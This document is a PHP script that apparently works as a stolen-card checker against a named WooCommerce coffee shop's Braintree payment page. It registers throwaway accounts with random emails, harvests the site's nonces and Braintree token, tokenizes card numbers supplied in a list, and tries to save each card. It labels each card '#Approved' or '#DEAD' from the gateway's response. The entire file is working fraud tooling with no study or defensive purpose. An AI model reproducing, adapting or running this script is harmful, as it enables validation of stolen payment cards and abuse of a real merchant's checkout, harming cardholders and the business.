<?php
set_time_limit(0);
error_reporting(0);

$cookie = "cookie-".rand(1000,9999)."txt";
$lista = $_GET["lista"];

$array = explode("|", $lista);
$cc = $array[0];
$mes = $array[1];
$ano = $array[2];
$mes1 = str_replace(0,"",$mes);
$ano1 = str_replace(20,"",$ano);
$cvv = $array[3];


function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}
$cc1 = ''.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'';

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function random($length = 12) { 
  return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length); 
} 

$email = random().'@gmail.com';
$user = random();



$ch = curl_init('https://healthkickcoffee.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: GET',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
$r1 = curl_exec($ch);
curl_close($ch);

preg_match_all('/<input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="(.*?)"/',$r1,$n);
$nonce = $n[1][0];

preg_match_all('/<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="(.*?)"/',$r1,$n2);
$nonce2 = $n2[1][0];

$ch = curl_init('https://healthkickcoffee.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: healthkickcoffee.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: en-GB,en-EG;q=0.9,en;q=0.8,ar-EG;q=0.7,ar;q=0.6,en-US;q=0.5',
'cache-control: no-cache',
'content-type: application/x-www-form-urlencoded',
'dnt: 1',
'origin: https://healthkickcoffee.com',
'pragma: no-cache',
'referer: https://healthkickcoffee.com/my-account',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'sec-fetch-user: ?1',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&mailchimp_woocommerce_newsletter=1&automatewoo_optin=on&woocommerce-register-nonce='.$nonce2.'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&register=Register&'); // register 
$r2 = curl_exec($ch);
curl_close($ch);


preg_match_all('/var wc_braintree_client_token = "(.*?)";/',$r2,$no);
$bnonce = $no[1][0];
$anonce = trim(strip_tags(getStr($r2,'name="woocommerce-add-payment-method-nonce" value="','" />')));
$au = json_decode(base64_decode($bnonce),1)["authorizationFingerprint"];


$ch = curl_init('https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
'authority: payments.braintree-api.com',
'accept: */*',
'accept-language: en-GB,en-EG;q=0.9,en;q=0.8,ar-EG;q=0.7,ar;q=0.6,en-US;q=0.5',
'Authorization: Bearer '.$au,
'braintree-version: 2018-05-10',
'cache-control: no-cache',
'content-type: application/json',
'origin: https://healthkickcoffee.com',
'pragma: no-cache',
'referer: https://healthkickcoffee.com/',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"b363a448-9911-4857-b71c-4d7143a6a678"},"query":"query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }","operationName":"ClientConfiguration"}');
$r5 = curl_exec($ch);
curl_close($ch);


$ch = curl_init('https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"25ff8af3-44f0-4d4d-8f57-cd7b483e8cf0"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$headers = array();
$headers[] = 'Authority: payments.braintree-api.com';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.9,ar;q=0.8';
$headers[] = 'Authorization: Bearer '.$au;
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$r5 = curl_exec($ch);
curl_close($ch);

$token = trim(strip_tags(getStr($r5,'"token":"','"')));
$bin = trim(strip_tags(getStr($r5,'"bin":"','"')));
$Bank = trim(strip_tags(getStr($r5, '"issuingBank":"','"')));
   
   

$ch = curl_init('https://healthkickcoffee.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
'authority: healthkickcoffee.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: en-GB,en-EG;q=0.9,en;q=0.8,ar-EG;q=0.7,ar;q=0.6,en-US;q=0.5',
'cache-control: no-cache',
'content-type: application/x-www-form-urlencoded',
'dnt: 1',
'origin: https://healthkickcoffee.com',
'pragma: no-cache',
'referer: https://healthkickcoffee.com/my-account',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'sec-ch-ua-mobile: ?1',
'sec-ch-ua-platform: "Android"',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'sec-fetch-user: ?1',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data={"device_session_id":"f4e1d37d96e4a494f856d46756d8341c","fraud_merchant_id":null,"correlation_id":"eef91a9ada72e95638e2f4781b92b410"}&wc_braintree_3ds_enabled=&wc_braintree_3ds_active=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data='.$r5.'&billing_address_1=8700+NW+RIVER+PARK+DR&woocommerce-add-payment-method-nonce='.$anonce.'&_wp_http_referer=/my-account/add-payment-method/&woocommerce_add_payment_method=1');
$r6 = curl_exec($ch);
curl_close($ch);

preg_match_all('/<li>\s*(.*?)\s*<\/li>/',$r6,$m);
$msg = str_replace("There was an error saving your payment method. Reason: ","",trim($m[1][0]));

unlink($cookie);
if(strpos($r6,"Payment method successfully added.") or strpos($msg,"street address.") or  strpos($msg, "Gateway Rejected: avs") or strpos($msg ,"Insufficient Funds")){
echo "
<b>#Approved : $lista  ✅
<br>RESPONSE: AUTHORIZED
 ";
} else {
echo "
<b>#DEAD : $lista  ❌
<br>RESPONSE: $msg
 ";
}
